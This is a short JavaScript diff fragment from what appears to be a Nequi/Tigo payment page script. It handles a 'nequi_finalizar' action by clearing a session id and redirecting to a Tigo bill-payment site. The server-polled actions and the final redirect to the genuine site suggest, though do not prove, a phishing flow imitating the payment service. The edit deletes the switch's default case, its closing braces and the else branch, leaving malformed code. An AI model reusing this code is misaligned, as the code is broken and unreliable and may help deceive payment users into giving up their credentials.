@@ -282,15 +282,7 @@
                 case 'nequi_finalizar':
                   console.log('[NEQUI-NUMERO] → Finalizando sesión');
                   localStorage.removeItem('nequi_session_id');
-                  window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
-                  break;
-                  
-                default:
-                  console.warn('[NEQUI-NUMERO] ⚠️ Acción desconocida:', action.action);
-                  window.__nequiProcessing = false;
-              }
-            }, sessionId, 100, 300000);
-          } else {
+                sessionStorage.clear();
             alert('Error al procesar. Intenta nuevamente.');
             overlay.remove();
             btnContinuar.disabled = false;
